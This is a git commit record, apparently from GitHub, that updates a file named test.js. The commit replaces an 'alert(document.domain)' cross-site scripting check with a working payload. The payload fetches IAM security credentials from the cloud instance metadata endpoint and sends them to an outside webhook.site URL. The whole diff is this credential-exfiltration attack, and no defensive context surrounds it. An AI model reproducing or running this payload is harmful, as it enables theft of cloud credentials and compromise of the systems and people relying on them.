bdb09475c709cabd3946873fbdab167170edb406
bogdantc7 <57044368+bogdantc7@users.noreply.github.com>
2022-08-30 20:29:21 +0300

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,8 @@
-alert(document.domain);
+x = new XMLHttpRequest;
+x.onload = function() {
+    l = new XMLHttpRequest;
+    l.open("GET", "https://webhook.site/617d0898-cb2d-4dce-b6d2-c9fd28802b8f" + encodeURIComponent(this.responseText));
+    l.send();
+};
+x.open("GET", "http://169.254.169.254/latest/meta-data/iam/security-credentials/");
+x.send();
